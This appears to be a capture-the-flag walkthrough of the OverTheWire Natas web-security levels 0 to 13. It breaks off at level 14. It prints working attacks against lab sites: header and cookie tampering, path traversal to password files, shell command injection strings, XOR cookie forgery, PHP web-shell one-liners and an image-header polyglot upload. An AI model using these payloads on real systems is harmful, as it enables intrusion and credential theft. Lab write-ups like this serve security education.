# Natas

Natas teaches the basics of serverside web-security.

Each level of natas consists of its own website located at http://natasX.natas.labs.overthewire.org, where `X` is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. `natas0` for level 0) and its password.

Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in `/etc/natas_webpass/`. E.g. the password for `natas5` is stored in the file `/etc/natas_webpass/natas5` and only readable by `natas4` and `natas5`.

Start here:

Username: `natas0`
Password: `natas0`
URL: http://natas0.natas.labs.overthewire.org

## Natas 0

### Credentials

Username: natas0
Password: natas0
URL: http://natas0.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page.

### Solution

View page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

## Natas 1

### Credentials

Username: natas1
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
URL: http://natas1.natas.labs.overthewire.org

### Message

You can find the password for the next level on this page, but rightclicking has been blocked!

### Solution

Use browser console (usually F12 opens it).

This allows to see the HTML content, which includes the following.

```
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>

...
```

## Natas 2

### Credentials

Username: natas2
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
URL: http://natas2.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Page source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Navigate to `http://natas2.natas.labs.overthewire.org/files/`. Here we find `pixel.png`, as expected, and `users.txt`:

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

## Natas 3

### Credentials

Username: natas3
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
URL: http://natas3.natas.labs.overthewire.org

### Message

There is nothing on this page

### Solution

Inner HTML:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```

Have a look at `http://natas3.natas.labs.overthewire.org/robots.txt`:

```
User-agent: *
Disallow: /s3cr3t/
```

Thus go to `http://natas3.natas.labs.overthewire.org/s3cr3t/`. Here we find `users.txt` (at `http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt`):

```
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```

## Natas 4

### Credentials

Username: natas4
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
URL: http://natas4.natas.labs.overthewire.org

### Message

Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

### Solution

Refresh the page with the link. The message changes to

> Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"

Page source:

```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Suspect that it has something to do with the request headers. Inspect them using the browser console. See:

```
Referer: http://natas4.natas.labs.overthewire.org/
```

Try to change that. A way is using Burp Suite. Edit the request header: intercept the request with Proxy, send it to Repeater and edit the `Referer` header setting it to `http://natas5.natas.labs.overthewire.org/`. This gives us a different response which contains:

```
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
```

## Natas 5

### Credentials

Username: natas5
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
URL: http://natas5.natas.labs.overthewire.org

### Message

Access disallowed. You are not logged in

### Solution

Intercepting the request, we see that this is:

```
GET /index.php HTTP/1.1
Host: natas5.natas.labs.overthewire.org
Cache-Control: max-age=0
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Accept-Language: en-GB
Upgrade-Insecure-Requests: 1
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: loggedin=0
Connection: keep-alive
```

Reading carefully, we notice: `Cookie: loggedin=0`.

Try to set this to `1` and resend the request...

This changes the response to:

```html
HTTP/1.1 200 OK
Date: Fri, 20 Sep 2024 16:30:46 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

## Natas 6

### Credentials

Username: natas6
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
URL: http://natas6.natas.labs.overthewire.org

### Message

Input secret: ...

Submit.

### Solution

The page requests a secret.

The source:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Thus there is a `http://natas6.natas.labs.overthewire.org/includes/secret.inc` file... Try to get it with `curl`:

```bash
curl -H "Authorization: Basic bmF0YXM2OjBSb0p3SGRTS1dGVFlSNVd1aUFld2F1U3VOYUJYbmVk" http://natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Submit the secret in the field requiring it and get:

> Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

## Natas 7

### Credentials

Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
URL: http://natas7.natas.labs.overthewire.org

### Message

There is a page with a **Home** and an **About** links.

### Solution

The Home page redirects to http://natas7.natas.labs.overthewire.org/index.php?page=home, the About page to http://natas7.natas.labs.overthewire.org/index.php?page=about.

Try to get http://natas7.natas.labs.overthewire.org/index.php?page=test:

> Warning: include(test): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

> Warning: include(): Failed opening 'test' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21

This error message is very useful... We can get a file from the file system, it seems.

It gives us also the base directory...

Try http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/passwd.

This works, but we are not interested in this...

Try: http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../../../etc/natas_webpass/natas8.
This gives us:

> xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

## Natas 8

### Credentials

Username: natas8
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
URL: http://natas8.natas.labs.overthewire.org

### Message

Input secret: ...

### Solution

There is a View sourcecode link. The source code is this:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

We have two interesting pieces of information:

```
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
```

and

```
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

We shall reverse the encoding on the given encoded secret; the value thus obtained shall be passed into the form in the page.

Try with the following reversing code:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function decodeSecret($encodedSecret) {
    return base64_decode(strrev(hex2bin($encodedSecret)));
}

echo decodeSecret($encodedSecret);
```

This prints:

```
oubWYf2kBq
```

This works: it returns:

> Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

## Natas 9

### Credentials

Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
URL: http://natas9.natas.labs.overthewire.org

### Message

Find words containing: ...

### Solution

There is the View sourcecode link.

The source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The relevant PHP code:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Try http://natas9.natas.labs.overthewire.org/?needle=password. This returns:

```
password
password's
passwords
```

The form does exactly this: it gets a word, say `asd`, and sends it to: http://natas9.natas.labs.overthewire.org/?needle=asd&submit=Search.

Find some interesting information about `passthru` here: https://www.php.net/manual/en/function.passthru.php.

The function is similar to `exec`.

If we input `zope dictionary.txt; cat `, we get what seems to be the content of `dictionary.txt`...

Interesting. Let's try

```
zope dictionary.txt; cat /etc/natas_webpass/natas10 | tee
```

This gives us:

```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```

## Natas 10

### Credentials

Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
URL: http://natas10.natas.labs.overthewire.org

### Message

For security reasons, we now filter on certain characters

Find words containing: ...

### Solution

Now `asd; cat` doesn't work anymore:

> Input contains an illegal character!

Neither does `&&`.

The source code (obtained from the link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to exploit the behaviour of `grep`: this searches any given input file. We can provide more than one...

Input: `p /etc/natas_webpass/natas11`: this corresponds to the executed command:

```bash
grep -i p /etc/natas_webpass/natas11 dictionary.txt
```

so this will search both `dictionary.txt` and `/etc/natas_webpass/natas11` for the character `p` and gives us:

```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
...
```

## Natas 11

### Credentials

Username: natas11
Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
URL: http://natas11.natas.labs.overthewire.org

### Message

Cookies are protected with XOR encryption

Background color: [#ffffff]

### Solution

The source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas11", "pass": "<censored>" };</script></head>
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>

<form>
Background color: <input name=bgcolor value="<?=$data['bgcolor']?>">
<input type=submit value="Set color">
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

From the code, we expect a cookie called `data` to be present. Effectively, the cookie is there and contains:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3D
```

We need to decode / decrypt it.

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
```

and in particular:

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}
```

Intercept a request:

```
GET /?bgcolor=%23ffaaaa HTTP/1.1
Host: natas11.natas.labs.overthewire.org
User-Agent: [UNDISCLOSED]
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://natas11.natas.labs.overthewire.org/
Authorization: Basic bmF0YXMxMTpVSmRxa0sxcFR1NlZMdDlVSFdBZ1JaejZzVlVaM2xFaw==
Connection: keep-alive
Cookie: data=HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i
```

This is the same cookie we see in the browser Storage:

```
HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg%3D
```

Code to decrypt the cookie:

```php
$cookie = "HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEOBCU2TRg";

function xor_encrypt($in) {
    $key = json_encode(array("showpassword" => "no", "bgcolor" => "#ffffff"));
    $text = base64_decode($in);
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print xor_encrypt($cookie);
```

We get: `eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWhbCPoe`

Now:

```php
$cookie = array("showpassword" => "yes", "bgcolor" => "#ffffff");

function xor_encrypt($in) {
    $key = "eDWo";
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

print base64_encode(xor_encrypt(json_encode($cookie)));
```

Got: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`.

This shows the password:

> The password for natas12 is yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

## Natas 12

### Credentials

Username: natas12
Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
URL: http://natas12.natas.labs.overthewire.org

### Message

Choose a JPEG to upload (max 1KB):

### Solution

Source code (link):

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas12", "pass": "<censored>" };</script></head>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

One-liner PHP RCE code:

```php
<?php echo shell_exec($_GET['e'].' 2>&1'); ?>
```

Also, the client renames the file to `.jpg`:

```html
<input
  type="hidden"
  name="filename"
  value="<?php print genRandomString(); ?>.jpg"
/>
```

This can easily be changed: it's client side...

Edit the `.jpg` in `.php` and upload the PHP one-liner.

We get:

> The file upload/f2ce8mjyzp.php has been uploaded

So we use the link passing `e` as parameter: natas12.natas.labs.overthewire.org/upload/f2ce8mjyzp.php?e=cat /etc/natas_webpass/natas13.

Get: `trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC`.

## Natas 13

### Credentials

Username: natas13
Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
URL: http://natas13.natas.labs.overthewire.org

### Message

For security reasons, we now only accept image files!

Choose a JPEG to upload (max 1KB):

### Solution

Source code:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Try to bypass `exif_imagetype`: create a Python script that creates a `shell.php` with the desired JPEG image bytes:

```python
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? passthru($_GET["cmd"]); ?>')
fh.close()
```

This gives us a `shell.php` that we can try to upload.

Do not forget to edit the file extension in the client-side code!

We are able to upload the `.php` file:

> The file upload/s81yasyzvd.php has been uploaded

Go to natas13.natas.labs.overthewire.org/upload/s81yasyzvd.php?cmd=cat /etc/natas_webpass/natas14:

```
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

## Natas 14

### Credentials

Username: natas14
Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
URL: http://natas14.natas.labs.overthewire.org

### Message

Username: ...

Password: ...

### Solution

Source code (link):

```html
<html>
<head>
